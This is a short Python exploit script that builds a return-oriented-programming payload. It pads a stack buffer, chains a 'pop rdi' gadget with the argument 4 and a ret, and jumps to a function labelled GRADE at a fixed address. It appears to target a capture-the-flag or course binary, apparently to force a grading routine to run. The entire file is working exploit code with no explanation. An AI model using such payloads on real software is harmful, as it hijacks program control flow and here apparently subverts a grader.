import sys
from struct import pack

POP_RDI = 0x401a33
RET     = 0x401a34
GRADE   = 0x401978

payload  = b"A" * 16
payload += b"B" * 8
payload += pack("<Q", POP_RDI)
payload += pack("<Q", 4)
payload += pack("<Q", RET)
payload += pack("<Q", GRADE)
payload += pack("<Q", 0)

sys.stdout.buffer.write(payload + b"\n")
